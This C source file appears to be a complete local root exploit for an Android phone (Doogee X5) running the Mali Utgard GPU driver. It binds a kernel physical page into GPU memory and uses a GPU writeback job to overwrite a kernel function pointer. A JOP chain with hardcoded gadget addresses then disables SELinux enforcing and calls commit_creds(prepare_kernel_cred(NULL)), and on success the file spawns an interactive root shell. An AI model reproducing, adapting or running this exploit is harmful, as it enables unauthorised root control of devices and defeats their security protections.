#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>

// IOCTL defs
#define MALI_IOC_BASE 0x82
#define _MALI_UK_CORE_SUBSYSTEM 0
#define _MALI_UK_MEMORY_SUBSYSTEM 1
#define _MALI_UK_PP_SUBSYSTEM 2

#define MALI_IOC_CORE_BASE (_MALI_UK_CORE_SUBSYSTEM + MALI_IOC_BASE)
#define MALI_IOC_MEMORY_BASE (_MALI_UK_MEMORY_SUBSYSTEM + MALI_IOC_BASE)
#define MALI_IOC_PP_BASE (_MALI_UK_PP_SUBSYSTEM + MALI_IOC_BASE)

#define _MALI_NOTIFICATION_PP_FINISHED ((_MALI_UK_PP_SUBSYSTEM << 16) | 0x10)

#define _MALI_UK_WAIT_FOR_NOTIFICATION 2
#define _MALI_UK_ALLOC_MEM 0
#define _MALI_UK_FREE_MEM 1
#define _MALI_UK_BIND_MEM 2
#define _MALI_UK_UNBIND_MEM 3
#define _MALI_UK_PP_START_JOB 0

// struct size constants
#define MALI_UK_TIMELINE_MAX 3
#define _MALI_PP_MAX_SUB_JOBS 8
#define _MALI_PP_MAX_FRAME_REGISTERS ((0x058 / 4) + 1) /* 23 */
#define _MALI_PP_MAX_WB_REGISTERS ((0x02C / 4) + 1)    /* 12 */
#define _MALI_DLBU_MAX_REGISTERS 4

// flag for mem
#define _MALI_MEMORY_BIND_BACKEND_EXTERNAL_MEMORY (1 << 11)

// kernel structs
typedef struct
{
    uint32_t points[MALI_UK_TIMELINE_MAX];
    int32_t sync_fd;
} mali_uk_fence_t;

typedef struct
{
    uint64_t ctx;
    uint32_t gpu_vaddr;
    uint32_t vsize;
    uint32_t psize;
    uint32_t flags;
    uint64_t backend_handle;
    // int32_t  secure_shared_fd; // needed on some devices
} mali_uk_alloc_mem_s;

typedef struct
{
    uint64_t ctx;
    uint32_t gpu_vaddr;
    uint32_t free_pages_nr;
} mali_uk_free_mem_s;

typedef struct
{
    uint64_t ctx;
    uint32_t vaddr;
    uint32_t size;
    uint32_t flags;
    uint32_t padding;
    union
    {
        struct
        {
            uint32_t secure_id;
            uint32_t rights;
            uint32_t flags;
        } bind_ump;
        struct
        {
            uint32_t mem_fd;
            uint32_t rights;
            uint32_t flags;
        } bind_dma_buf;
        struct
        {
            uint32_t phys_addr;
            uint32_t rights;
            uint32_t flags;
        } bind_ext_memory;
    } mem_union;
} mali_uk_bind_mem_s;

typedef struct
{
    uint64_t ctx;
    uint32_t flags;
    uint32_t vaddr;
} mali_uk_unbind_mem_s;

typedef struct
{
    uint64_t ctx;
    uint64_t user_job_ptr;
    uint32_t priority;
    uint32_t frame_registers[_MALI_PP_MAX_FRAME_REGISTERS];
    uint32_t frame_registers_addr_frame[_MALI_PP_MAX_SUB_JOBS - 1];
    uint32_t frame_registers_addr_stack[_MALI_PP_MAX_SUB_JOBS - 1];
    uint32_t wb0_registers[_MALI_PP_MAX_WB_REGISTERS];
    uint32_t wb1_registers[_MALI_PP_MAX_WB_REGISTERS];
    uint32_t wb2_registers[_MALI_PP_MAX_WB_REGISTERS];
    uint32_t dlbu_registers[_MALI_DLBU_MAX_REGISTERS];
    uint32_t num_cores;
    uint32_t perf_counter_flag;
    uint32_t perf_counter_src0;
    uint32_t perf_counter_src1;
    uint32_t frame_builder_id;
    uint32_t flush_id;
    uint32_t flags;
    uint32_t tilesx;
    uint32_t tilesy;
    uint32_t heatmap_mem;
    uint32_t num_memory_cookies;
    uint64_t memory_cookies;
    mali_uk_fence_t fence;
    uint64_t timeline_point_ptr;
} mali_uk_pp_start_job_s;

typedef struct
{
    uint64_t ctx;
    uint32_t type;
    uint32_t _pad;
    union
    {
        struct
        {
            uint64_t user_job_ptr;
            uint32_t status;
            uint32_t perf_counter0[_MALI_PP_MAX_SUB_JOBS];
            uint32_t perf_counter1[_MALI_PP_MAX_SUB_JOBS];
            uint32_t perf_counter_src0;
            uint32_t perf_counter_src1;
        } pp_job_finished;
        uint8_t raw[88];
    } data;
} mali_uk_wait_for_notification_s;

// ioctl numbers for mali
#define MALI_IOC_MEM_ALLOC \
    _IOWR(MALI_IOC_MEMORY_BASE, _MALI_UK_ALLOC_MEM, mali_uk_alloc_mem_s)
#define MALI_IOC_MEM_FREE \
    _IOWR(MALI_IOC_MEMORY_BASE, _MALI_UK_FREE_MEM, mali_uk_free_mem_s)
#define MALI_IOC_MEM_BIND \
    _IOWR(MALI_IOC_MEMORY_BASE, _MALI_UK_BIND_MEM, mali_uk_bind_mem_s)
#define MALI_IOC_MEM_UNBIND \
    _IOWR(MALI_IOC_MEMORY_BASE, _MALI_UK_UNBIND_MEM, mali_uk_unbind_mem_s)
#define MALI_IOC_PP_START_JOB \
    _IOWR(MALI_IOC_PP_BASE, _MALI_UK_PP_START_JOB, mali_uk_pp_start_job_s)
#define MALI_IOC_WAIT_FOR_NOTIFICATION \
    _IOWR(MALI_IOC_CORE_BASE, _MALI_UK_WAIT_FOR_NOTIFICATION, mali_uk_wait_for_notification_s)

// PP frame register indices (hardware-defined)
#define FR_PLBU_ARRAY_ADDR 0
#define FR_RENDER_ADDR 1
#define FR_FLAGS 3
#define FR_CLEAR_DEPTH 4
#define FR_CLEAR_STENCIL 5
#define FR_CLEAR_COLOR_0 6
#define FR_CLEAR_COLOR_1 7
#define FR_CLEAR_COLOR_2 8
#define FR_CLEAR_COLOR_3 9
#define FR_WIDTH 10
#define FR_HEIGHT 11
#define FR_FRAG_STACK_ADDR 12
#define FR_FRAG_STACK_SIZE 13
#define FR_DUBYA 18
#define FR_BLOCKING 20
#define FR_SCALE 21
#define FR_FOUREIGHT 22

// WB register indices (hardware-defined)
#define WB_TYPE 0
#define WB_ADDRESS 1
#define WB_PIXEL_FORMAT 2
#define WB_DOWNSAMPLE 3
#define WB_PIXEL_LAYOUT 4
#define WB_PITCH 5
#define WB_MRT_BITS 6

// Constant-colour fragment shader (output = clear_color register)
static const uint32_t fragment_shader[] = {
    0x00020425,
    0x0000000c,
    0x01e007cf,
    0xb0000000,
    0x000005f5,
};

// exploit constants
#define PAGE_SIZE 4096

// target a fop function pointer > 0x400 inside of
// a page or you tend to hit open method = bad as no r1
#define TARGET_KERNEL_VA 0xc0d3aef4 // kernel VA to overwrite
#define TARGET_PHYS_ADDR 0x80d3a000 // page-aligned physical address
#define TARGET_PAGE_OFFSET 0xb00    // byte offset within page

#define JOPCHAIN_BUFFER_SIZE 1024

#define PREPARE_KERNEL_CRED_ADDR 0xc0046e44
#define COMMIT_CREDS_ADDR 0xc0046760
#define SELINUX_ENFORCING_ADDR 0xc0ff8e84
#define FIRST_GADGET_ADDR 0xc023ac68

#define VICTIM_PROC_FILE_PATH "/proc/driver/camera_info"

// GPU VA layout
#define GPU_VA_DATA 0x40000000
#define GPU_VA_TARGET 0x40030000
#define BUF_SIZE (PAGE_SIZE * 4)

// Buffer offsets for job components
#define OFF_PLB 0x000
#define OFF_SHADER 0x080
#define OFF_RSW 0x100
#define OFF_TILEBLK 0x200
#define OFF_STACK 0x1000

static int fd = -1;

// nice lil status function
static const char *status_str(uint32_t s)
{
    if (s & (1 << 16))
        return "SUCCESS";
    if (s & (1 << 17))
        return "OUT_OF_MEMORY";
    if (s & (1 << 18))
        return "ABORT";
    if (s & (1 << 19))
        return "TIMEOUT";
    if (s & (1 << 20))
        return "HANG";
    if (s & (1 << 21))
        return "SEG_FAULT";
    if (s & (1 << 22))
        return "ILLEGAL_JOB";
    if (s & (1 << 23))
        return "UNKNOWN_ERR";
    return "???";
}

// unbind wrapper
static int unbind(uint32_t gpu_vaddr)
{
    mali_uk_unbind_mem_s args;
    memset(&args, 0, sizeof(args));
    args.flags = _MALI_MEMORY_BIND_BACKEND_EXTERNAL_MEMORY;
    args.vaddr = gpu_vaddr;
    return ioctl(fd, MALI_IOC_MEM_UNBIND, &args);
}

int trigger_overwritten_function_pointer()
{
    uint64_t buffer[1024];
    int fd;

    // Try to open the device normally
    fd = open(VICTIM_PROC_FILE_PATH, O_RDONLY);
    if (fd < 0)
    {
        return 1;
    }

    // Construct the JOP-chain the kernel will execute
    uint32_t jop_buffer[JOPCHAIN_BUFFER_SIZE / 4];
    memset(jop_buffer, 0, sizeof(jop_buffer));

    // turns off selinux enforcing, then executes commit_creds(prepare_kernel_cred(NULL)) to get root

    // Save stack values
    //   c023ac68 0d c0 a0 e1     cpy        r12,sp
    //   c023ac6c f0 d8 2d e9     stmdb      sp!,{r4,r5,r6,r7,r11,r12,lr,pc}
    //   c023ac70 04 b0 4c e2     sub        r11,r12,#0x4
    //   c023ac74 04 30 91 e5     ldr        r3,[r1,#0x4]
    //   c023ac78 01 50 a0 e1     cpy        r5,r1
    //   c023ac7c 28 60 91 e5     ldr        r6,[r1,#0x28]
    //   c023ac80 00 70 a0 e1     cpy        r7,r0
    //   c023ac84 33 ff 2f e1     blx        r3
    jop_buffer[0x4 / 4] = 0xc0083770; // r3, next gadget
    jop_buffer[0x28 / 4] = 0x0;       // r6, unused

    // Lets start with disabling selinux

    // Load value into r0 (address of selinux enforcing)
    //   c0083770 10 30 91 e5     ldr        r3,[r1,#0x10]
    //   c0083774 00 50 a0 e1     cpy        r5,r0
    //   c0083778 01 40 a0 e1     cpy        r4,r1
    //   c008377c 18 00 91 e5     ldr        r0,[r1,#0x18]
    //   c0083780 04 10 91 e5     ldr        r1,[r1,#0x4]
    //   c0083784 33 ff 2f e1     blx        r3
    jop_buffer[0x10 / 4] = 0xc07fa654;                    // r3, next gadget
    jop_buffer[0x18 / 4] = SELINUX_ENFORCING_ADDR - 0x1c; // r0, selinux enforcing global address
    // jop_buffer[0x4 / 4] = 0xc0083770; // IGNORE

    // Load 0x0 into r6 to write to the global
    //   c07fa654 38 30 94 e5     ldr        r3,[r4,#0x38]
    //   c07fa658 00 00 53 e3     cmp        r3,#0x0
    //   c07fa65c 04 00 00 0a     beq        LAB_c07fa674
    //   c07fa660 44 60 94 e5     ldr        r6,[r4,#0x44]
    //   c07fa664 33 ff 2f e1     blx        r3
    jop_buffer[0x38 / 4] = 0xc0653300; // r3, next gadget
    jop_buffer[0x44 / 4] = 0x0;        // r6, value to write to selinux enforcing

    // Save 0 at enforcing
    //   c0653300 1c 60 80 e5     str        r6,[r0,#0x1c]
    //   c0653304 68 00 94 e5     ldr        r0,[r4,#0x68]
    //   c0653308 08 30 90 e5     ldr        r3,[r0,#0x8]
    //   c065330c 10 30 93 e5     ldr        r3,[r3,#0x10]
    //   c0653310 33 ff 2f e1     blx        r3
    jop_buffer[0x68 / 4] = (uint32_t)(jop_buffer);    // r0, gadget loaded from there
    jop_buffer[0x8 / 4] = (uint32_t)(jop_buffer - 1); // r3, must point to next gadget - 0x10
    jop_buffer[0xc / 4] = 0xc03a2c28;                 // r3, next gadget

    // Now selinux enforcing dealt with, lets execute commit_creds(prepare_kernel_cred(NULL))

    // Clear r0
    //   c03a2c28 48 30 90 e5     ldr        r3,[r0,#0x48]
    //   c03a2c2c 00 00 a0 e3     mov        r0,#0x0
    //   c03a2c30 33 ff 2f e1     blx        r3
    jop_buffer[0x48 / 4] = 0xc05d1b74; // r3, next gadget

    // Call prepare_kernel_cred
    //   c05d1b74 74 30 94 e5     ldr        r3,[r4,#0x74]
    //   c05d1b78 00 00 53 e3     cmp        r3,#0x0          // ignore
    //   c05d1b7c 2a 00 00 0a     beq        LAB_c05d1c2c     // ignore
    //   c05d1b80 33 ff 2f e1     blx        r3
    //   c05d1b84 64 30 94 e5     ldr        r3,[r4,#0x64]
    //   c05d1b88 33 ff 2f e1     blx        r3
    jop_buffer[0x74 / 4] = PREPARE_KERNEL_CRED_ADDR; // r3, address of the function to call (prepare_kernel_cred)
    jop_buffer[0x64 / 4] = 0xc08c2748;               // r3, address of the next gadget

    // Just needed to fix r5 for next gadget
    //   c08c2748 c0 31 94 e5     ldr        r3,[r4,#0x1c0]
    //   c08c274c 50 50 84 e2     add        r5,r4,#0x50    // get valid address into r5
    //   c08c2750 34 21 84 e5     str        r2,[r4,#0x134]
    //   c08c2754 33 ff 2f e1     blx        r3
    jop_buffer[0x1c0 / 4] = 0xc05d135c; // r3, next gadget

    // Call commit_creds without touching r0
    //   c05d135c 50 30 94 e5     ldr        r3,[r4,#0x50]
    //   c05d1360 33 ff 2f e1     blx        r3
    //   c05d1364 5c 30 94 e5     ldr        r3,[r4,#0x5c]
    //   c05d1368 b4 00 d5 e1     ldrh       r0,[r5,#0x4]   // ignore, just make sure r5 is valid
    //   c05d136c 33 ff 2f e1     blx        r3
    jop_buffer[0x50 / 4] = COMMIT_CREDS_ADDR; // r3, address of the function to call (commit_creds)
    jop_buffer[0x5c / 4] = 0xc023acd4;        // r3, address of the next gadget

    // Cleanup stack like nothing ever happened
    //   c023acd4 04 00 a0 e1     cpy        r0=>DAT_fffffff4,r4
    //   c023acd8 f0 a8 9d e8     ldmia      sp,{r4,r5,r6,r7,r11,sp,pc}

    // Try a small read
    ssize_t bytes_read = read(fd, jop_buffer, sizeof(jop_buffer));

    close(fd);

    return 0;
}

void important_ascii_art()
{
    printf("\n");
    printf("\033[38;5;22m");
    printf("██   ██  ██████  ██████  ████████ \n");
    printf("\033[38;5;28m");
    printf("██  ██  ██    ██ ██   ██    ██    \n");
    printf("\033[38;5;34m");
    printf("█████   ██    ██ ██████     ██    \n");
    printf("\033[38;5;40m");
    printf("██  ██  ██    ██ ██   ██    ██    \n");
    printf("\033[38;5;46m");
    printf("██   ██  ██████  ██   ██    ██    \n");
    printf("\033[0m");
    printf("\n\033[38;5;34m           Doogee X5\033[0m\n\n");
}

int main()
{
    important_ascii_art();

    // Open mali ting
    fd = open("/dev/mali", O_RDWR);
    if (fd < 0)
    {
        printf("[-] open /dev/mali: %s\n", strerror(errno));
        return 1;
    }
    printf("[+] Successfully opened /dev/mali (fd=%d)\n\n", fd);

    // Step 1: Bind target kernel physical page into GPU VA space
    printf("[1] Binding phys 0x%08x -> GPU 0x%08x\n",
           TARGET_PHYS_ADDR, GPU_VA_TARGET);
    mali_uk_bind_mem_s bind = {0};
    bind.vaddr = GPU_VA_TARGET;
    bind.size = PAGE_SIZE;
    bind.flags = _MALI_MEMORY_BIND_BACKEND_EXTERNAL_MEMORY;
    bind.mem_union.bind_ext_memory.phys_addr = TARGET_PHYS_ADDR;
    bind.mem_union.bind_ext_memory.rights = 0x37;
    if (ioctl(fd, MALI_IOC_MEM_BIND, &bind) < 0)
    {
        printf("[-] BIND rejected: %s (errno=%d)\n", strerror(errno), errno);
        close(fd);
        return 1;
    }
    printf("[+] BIND accepted\n\n");

    // Step 2: Allocate GPU memory for PP job data
    printf("[2] Allocating job data buffer at GPU 0x%08x\n", GPU_VA_DATA);
    mali_uk_alloc_mem_s alloc = {0};
    alloc.gpu_vaddr = GPU_VA_DATA;
    alloc.psize = BUF_SIZE;
    alloc.vsize = BUF_SIZE;
    if (ioctl(fd, MALI_IOC_MEM_ALLOC, &alloc) < 0)
    {
        printf("[-] ALLOC failed: %s (errno=%d)\n", strerror(errno), errno);
        unbind(GPU_VA_TARGET);
        close(fd);
        return 1;
    }
    printf("[+] Allocated: backend_handle=0x%llx\n\n",
           (unsigned long long)alloc.backend_handle);

    // Step 3: Map job data buffer into CPU address space
    printf("[3] mmap job data buffer for CPU access\n");
    void *buf = mmap(NULL, BUF_SIZE, PROT_READ | PROT_WRITE,
                     MAP_SHARED, fd, GPU_VA_DATA);
    if (buf == MAP_FAILED)
    {
        printf("[-] mmap: %s\n", strerror(errno));
        goto free_gpu;
    }
    printf("[+] CPU ptr=%p\n\n", buf);

    // Step 4: Build PP job
    memset(buf, 0, BUF_SIZE);

    uint32_t gpu_plb = GPU_VA_DATA + OFF_PLB;
    uint32_t gpu_shader = GPU_VA_DATA + OFF_SHADER;
    uint32_t gpu_rsw = GPU_VA_DATA + OFF_RSW;
    uint32_t gpu_tileblk = GPU_VA_DATA + OFF_TILEBLK;
    uint32_t gpu_stack = GPU_VA_DATA + OFF_STACK;

    memcpy((uint8_t *)buf + OFF_SHADER, fragment_shader, sizeof(fragment_shader));

    uint32_t *rsw = (uint32_t *)((uint8_t *)buf + OFF_RSW);
    rsw[0x08] = 0x0000F008;
    rsw[0x09] = gpu_shader | 5;
    rsw[0x0D] = 0x00000100;

    uint32_t *plb = (uint32_t *)((uint8_t *)buf + OFF_PLB);
    plb[0] = 0x00000000;
    plb[1] = 0xB8000000;
    plb[2] = 0xE0000002 | ((gpu_tileblk >> 3) & ~0xE0000003u);
    plb[3] = 0xB0000000;
    plb[4] = 0x00000000;
    plb[5] = 0xBC000000;

    uint32_t wb_target = GPU_VA_TARGET + TARGET_PAGE_OFFSET;
    printf("[4] Building PP job:\n    WB target=0x%08x\n    value to write=0x%08x\n", wb_target, FIRST_GADGET_ADDR);

    mali_uk_pp_start_job_s job;
    memset(&job, 0, sizeof(job));
    job.user_job_ptr = 0xDEADBEEFCAFEBABEULL;
    job.num_cores = 1;

    job.frame_registers[FR_PLBU_ARRAY_ADDR] = gpu_plb;
    job.frame_registers[FR_RENDER_ADDR] = gpu_rsw;
    job.frame_registers[FR_FLAGS] = 0x01;
    job.frame_registers[FR_CLEAR_DEPTH] = 0x00FFFFFF;
    job.frame_registers[FR_CLEAR_COLOR_0] = (uint32_t)FIRST_GADGET_ADDR;
    job.frame_registers[FR_CLEAR_COLOR_1] = (uint32_t)FIRST_GADGET_ADDR;
    job.frame_registers[FR_CLEAR_COLOR_2] = (uint32_t)FIRST_GADGET_ADDR;
    job.frame_registers[FR_CLEAR_COLOR_3] = (uint32_t)FIRST_GADGET_ADDR;
    job.frame_registers[FR_WIDTH] = 0x100;
    job.frame_registers[FR_HEIGHT] = 0x100;
    job.frame_registers[FR_FRAG_STACK_ADDR] = gpu_stack;
    job.frame_registers[FR_DUBYA] = 0x77;
    job.frame_registers[FR_SCALE] = 0x0C;
    job.frame_registers[FR_FOUREIGHT] = 0x8888;

    job.wb0_registers[WB_TYPE] = 0x02;
    job.wb0_registers[WB_ADDRESS] = wb_target;
    job.wb0_registers[WB_PIXEL_FORMAT] = 0x03;
    job.wb0_registers[WB_PITCH] = (16 * 4) / 8;
    job.wb0_registers[WB_MRT_BITS] = 4;

    job.fence.sync_fd = -1;
    uint32_t timeline_point = 0;
    job.timeline_point_ptr = (uint64_t)(uintptr_t)&timeline_point;

    // Step 5. Submit the job
    printf("\n[5] Submitting PP job...\n");
    int ret = ioctl(fd, MALI_IOC_PP_START_JOB, &job);
    if (ret != 0)
    {
        printf("[-] PP_START_JOB: %s (errno=%d)\n", strerror(errno), errno);
        goto unmap;
    }
    printf("[+] Submitted, timeline_point=%u\n", timeline_point);

    // Step 6: Wait for job to complete
    printf("\n[6] Waiting for notification...\n");
    mali_uk_wait_for_notification_s notif;
    memset(&notif, 0, sizeof(notif));
    ret = ioctl(fd, MALI_IOC_WAIT_FOR_NOTIFICATION, &notif);
    if (ret != 0)
    {
        printf("[-] WAIT_FOR_NOTIFICATION: %s (errno=%d)\n", strerror(errno), errno);
        goto unmap;
    }

    if (notif.type == _MALI_NOTIFICATION_PP_FINISHED)
    {
        uint32_t st = notif.data.pp_job_finished.status;
        printf("[+] PP_FINISHED: status=0x%08x (%s)\n", st, status_str(st));
        if (st & (1 << 16))
            printf("[+] Write primitive: OK - 0x41414141 -> 0x%08x\n",
                   TARGET_KERNEL_VA);

        // should have done the write, lets get root now
        printf("\n[7] Triggering overwritten function pointer via %s...\n", VICTIM_PROC_FILE_PATH);
        trigger_overwritten_function_pointer();
    }
    else
    {
        printf("[?] Unexpected notification type: 0x%08x\n", notif.type);
    }

    printf("\n[8] Did we get root?\n");

    if (getuid() == 0)
    {
        printf("[+] We got root! Popping shell...\n");
        char *shell = "/system/bin/sh";
        char *args[] = {shell, "-i", NULL};
        execve(shell, args, NULL);
    }
    else
    {
        printf("[-] Utgard won the battle but not the war... try again\n");
    }

unmap:
    munmap(buf, BUF_SIZE);
    unbind(GPU_VA_TARGET);
free_gpu:;
    mali_uk_free_mem_s mfree = {0};
    mfree.gpu_vaddr = GPU_VA_DATA;
    ioctl(fd, MALI_IOC_MEM_FREE, &mfree);
    close(fd);
    return 0;
}
